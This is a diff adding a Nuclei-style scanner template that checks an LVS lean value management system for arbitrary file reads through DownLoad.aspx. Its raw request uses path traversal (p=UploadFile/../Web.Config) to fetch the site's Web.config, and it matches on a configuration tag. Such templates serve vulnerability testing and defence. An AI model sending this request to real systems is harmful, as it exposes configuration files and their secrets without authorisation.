@@ -1,0 +1,29 @@
+id: LVS-DownLoad-File-reading
+
+info:
+  name: LVS精益价值管理系统 DownLoad.aspx 任意文件读取
+  author: Superhero
+  severity: medium
+  description: LVS精益价值管理系统 DownLoad.aspx存在任意文件读取
+  tags: File reading
+  
+http:
+  - raw:
+      - |
+        GET /Business/DownLoad.aspx?p=UploadFile/../Web.Config HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<configuration>'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
